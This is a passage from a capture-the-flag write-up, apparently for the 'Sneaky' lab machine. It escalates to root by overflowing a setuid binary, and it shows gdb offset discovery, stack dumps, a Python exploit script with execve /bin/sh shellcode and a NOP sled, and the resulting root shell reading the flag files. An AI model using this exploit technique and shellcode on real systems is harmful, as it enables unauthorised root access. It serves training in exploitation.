(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
Starting program: /usr/local/bin/chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq

Program received signal SIGSEGV, Segmentation fault.
0x316d4130 in ?? ()
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4596] will be killed.

Quit anyway? (y or n) y
thrasivoulos@Sneaky:~$
```

```sh
root@kali:~/sneaky# /usr/bin/msf-pattern_offset -q 316d4130
[*] Exact match at offset 362
root@kali:~/sneaky#
```

```sh
thrasivoulos@Sneaky:~$ uname -a
Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux
thrasivoulos@Sneaky:~$ file /bin/ls
/bin/ls: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=cecbb9e27978d91bc6fe2cc4d46d0cd58deafdb2, stripped
thrasivoulos@Sneaky:~$
```

Selected a random `EIP` address by running `r $(python -c "print 'A'*500")` in `GDB`

```sh
thrasivoulos@Sneaky:~$ gdb /usr/local/bin/chal -q
Reading symbols from /usr/local/bin/chal...(no debugging symbols found)...done.
(gdb) r $(python -c "print 'A'*500")
Starting program: /usr/local/bin/chal $(python -c "print 'A'*500")

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) x/100x $esp
0xbffff4c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff500:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff510:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff520:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff530:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff540:	0x41414141	0xb7004141	0xbffff54c	0x0000001c
0xbffff550:	0x00000002	0xbffff685	0xbffff699	0x00000000
0xbffff560:	0xbffff88e	0xbffff89f	0xbffff8af	0xbffff8c3
0xbffff570:	0xbffff8e9	0xbffff8fc	0xbffff90e	0xbffffe2f
0xbffff580:	0xbffffe3b	0xbffffe99	0xbffffeb5	0xbffffec4
0xbffff590:	0xbffffedb	0xbffffeec	0xbffffef5	0xbfffff0d
0xbffff5a0:	0xbfffff15	0xbfffff2a	0xbfffff3f	0xbfffff87
0xbffff5b0:	0xbfffffa7	0xbfffffc6	0x00000000	0x00000020
0xbffff5c0:	0xb7fdccf0	0x00000021	0xb7fdc000	0x00000010
0xbffff5d0:	0x078bfbff	0x00000006	0x00001000	0x00000011
0xbffff5e0:	0x00000064	0x00000003	0x08048034	0x00000004
0xbffff5f0:	0x00000020	0x00000005	0x00000009	0x00000007
0xbffff600:	0xb7fde000	0x00000008	0x00000000	0x00000009
0xbffff610:	0x08048320	0x0000000b	0x000003e8	0x0000000c
0xbffff620:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
0xbffff630:	0x000003e8	0x00000017	0x00000001	0x00000019
0xbffff640:	0xbffff66b	0x0000001f	0xbfffffe8	0x0000000f
(gdb) x/100x $esp-400
0xbffff330:	0xbffff352	0x00000000	0x00000000	0x08048441
0xbffff340:	0xbffff352	0xbffff699	0x0804821d	0xb7fffc24
0xbffff350:	0x414118fc	0x41414141	0x41414141	0x41414141
0xbffff360:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff370:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff380:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff390:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3b0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3c0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3d0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3e0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff3f0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff400:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff410:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff420:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff430:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff440:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff450:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff460:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff470:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff480:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff490:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4a0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff4b0:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) quit
A debugging session is active.

	Inferior 1 [process 4609] will be killed.

Quit anyway? (y or n) y
thrasivoulos@Sneaky:~$
```

[`Linux x86 execve("/bin/sh") - 28 bytes`](http://shell-storm.org/shellcode/files/shellcode-811.php)

`bof.py`

```python
buffer_size = 362

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

nopsled = "\x90"* (buffer_size-len(shellcode))

eip = "\xb0\xf3\xff\xbf" #0xbffff3b0

payload = nopsled + shellcode + eip

print payload
```

```sh
thrasivoulos@Sneaky:~$ gdb /usr/local/bin/chal -q
Reading symbols from /usr/local/bin/chal...(no debugging symbols found)...done.
(gdb) r $(python bof.py)
Starting program: /usr/local/bin/chal $(python bof.py)

Program received signal SIGILL, Illegal instruction.
0xbffff3b2 in ?? ()
(gdb) x/100x $esp
0xbffff540:	0x00000000	0xbffff5d4	0xbffff5e0	0xb7feccca
0xbffff550:	0x00000002	0xbffff5d4	0xbffff574	0x0804a014
0xbffff560:	0x0804821c	0xb7fce000	0x00000000	0x00000000
0xbffff570:	0x00000000	0x1eded4ea	0x264130fa	0x00000000
0xbffff580:	0x00000000	0x00000000	0x00000002	0x08048320
0xbffff590:	0x00000000	0xb7ff24c0	0xb7e3ba09	0xb7fff000
0xbffff5a0:	0x00000002	0x08048320	0x00000000	0x08048341
0xbffff5b0:	0x0804841d	0x00000002	0xbffff5d4	0x08048450
0xbffff5c0:	0x080484c0	0xb7fed160	0xbffff5cc	0x0000001c
0xbffff5d0:	0x00000002	0xbffff70b	0xbffff71f	0x00000000
0xbffff5e0:	0xbffff88e	0xbffff89f	0xbffff8af	0xbffff8c3
0xbffff5f0:	0xbffff8e9	0xbffff8fc	0xbffff90e	0xbffffe2f
0xbffff600:	0xbffffe3b	0xbffffe99	0xbffffeb5	0xbffffec4
0xbffff610:	0xbffffedb	0xbffffeec	0xbffffef5	0xbfffff0d
0xbffff620:	0xbfffff15	0xbfffff2a	0xbfffff3f	0xbfffff87
0xbffff630:	0xbfffffa7	0xbfffffc6	0x00000000	0x00000020
0xbffff640:	0xb7fdccf0	0x00000021	0xb7fdc000	0x00000010
0xbffff650:	0x078bfbff	0x00000006	0x00001000	0x00000011
0xbffff660:	0x00000064	0x00000003	0x08048034	0x00000004
0xbffff670:	0x00000020	0x00000005	0x00000009	0x00000007
0xbffff680:	0xb7fde000	0x00000008	0x00000000	0x00000009
0xbffff690:	0x08048320	0x0000000b	0x000003e8	0x0000000c
0xbffff6a0:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
0xbffff6b0:	0x000003e8	0x00000017	0x00000001	0x00000019
0xbffff6c0:	0xbffff6eb	0x0000001f	0xbfffffe8	0x0000000f
(gdb)
0xbffff6d0:	0xbffff6fb	0x00000000	0x00000000	0x00000000
0xbffff6e0:	0x00000000	0x00000000	0x18000000	0x2ab42304
0xbffff6f0:	0xd2caf09a	0xd2e85243	0x693e6930	0x00363836
0xbffff700:	0x00000000	0x00000000	0x2f000000	0x2f727375
0xbffff710:	0x61636f6c	0x69622f6c	0x68632f6e	0x90006c61
0xbffff720:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff730:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff740:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff750:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff760:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff770:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff800:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff810:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff820:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff830:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff840:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff850:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb)
0xbffff860:	0x90909090	0x90909090	0x90909090	0x50c03190
0xbffff870:	0x732f2f68	0x622f6868	0xe3896e69	0xc289c189
0xbffff880:	0x80cd0bb0	0xcd40c031	0xfff3b080	0x445800bf
0xbffff890:	0x45535f47	0x4f495353	0x44495f4e	0x5300323d
0xbffff8a0:	0x4c4c4548	0x69622f3d	0x61622f6e	0x54006873
0xbffff8b0:	0x3d4d5245	0x72657478	0x35322d6d	0x6c6f6336
0xbffff8c0:	0x5300726f	0x435f4853	0x4e45494c	0x65643d54
0xbffff8d0:	0x623a6461	0x3a666565	0x313a3a32	0x20653030
0xbffff8e0:	0x37363935	0x32322032	0x48535300	0x5954545f
0xbffff8f0:	0x65642f3d	0x74702f76	0x00302f73	0x52455355
0xbffff900:	0x7268743d	0x76697361	0x6f6c756f	0x534c0073
0xbffff910:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
0xbffff920:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
0xbffff930:	0x30303d68	0x3d69703a	0x333b3034	0x6f733a33
0xbffff940:	0x3b31303d	0x643a3533	0x31303d6f	0x3a35333b
0xbffff950:	0x343d6462	0x33333b30	0x3a31303b	0x343d6463
0xbffff960:	0x33333b30	0x3a31303b	0x343d726f	0x31333b30
0xbffff970:	0x3a31303b	0x333d7573	0x31343b37	0x3d67733a
0xbffff980:	0x343b3033	0x61633a33	0x3b30333d	0x743a3134
0xbffff990:	0x30333d77	0x3a32343b	0x333d776f	0x32343b34
0xbffff9a0:	0x3d74733a	0x343b3733	0x78653a34	0x3b31303d
0xbffff9b0:	0x2a3a3233	0x7261742e	0x3b31303d	0x2a3a3133
0xbffff9c0:	0x7a67742e	0x3b31303d	0x2a3a3133	0x6a72612e
0xbffff9d0:	0x3b31303d	0x2a3a3133	0x7a61742e	0x3b31303d
0xbffff9e0:	0x2a3a3133	0x687a6c2e	0x3b31303d	0x2a3a3133
(gdb)
```

Select `EIP` from the `nopsled` on the `stack`

`bof.py`

```python
buffer_size = 362

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

nopsled = "\x90"* (buffer_size-len(shellcode))

eip = "\xf0\xf7\xff\xbf" #0xbffff7f0

payload = nopsled + shellcode + eip

print payload
```

```sh
thrasivoulos@Sneaky:~$ /usr/local/bin/chal $(python bof.py)
# id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(thrasivoulos)
# cd /root
# cat root.txt
c5153d86cb175a9d5d9a5cc81736fb33
# cd /home
# ls
minas  thrasivoulos
# cd thrasivoulos
# ls
bof.py	nc  user.txt
# cat user.txt
9fe14f76222db23a770f20136751bdab
# exit
thrasivoulos@Sneaky:~$
```